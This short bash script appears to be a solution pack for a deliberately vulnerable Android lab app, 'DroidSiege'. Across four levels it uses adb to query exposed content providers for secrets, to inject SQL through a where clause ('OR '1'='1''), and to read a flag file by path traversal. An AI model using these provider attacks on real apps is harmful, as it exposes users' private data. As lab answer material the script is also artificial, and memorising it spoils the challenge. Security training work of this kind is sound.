#!/usr/bin/env bash
# DroidSiege — components/provider tooling pack
set -euo pipefail

echo "== L1: open vault =="
adb shell content query --uri content://com.droidsiege.vault/secrets

echo
echo "== L2: realm gate =="
adb shell content query --uri content://com.droidsiege.vault/realm/core/secret

echo
echo "== L3: injectable lookup =="
adb shell content query --uri content://com.droidsiege.vault/lookup \
  --where "tag='x' OR '1'='1'"

echo
echo "== L4: plant the file in-app first ('Plant escrow file'), then traverse =="
adb shell content read --uri "content://com.droidsiege.vault/files/notes/../../secret_flag.txt" \
  || echo "(content read needs a newer platform; use run-as to prove the file exists:"
adb shell run-as com.droidsiege cat files/provider_files/secret_flag.txt 2>/dev/null || true
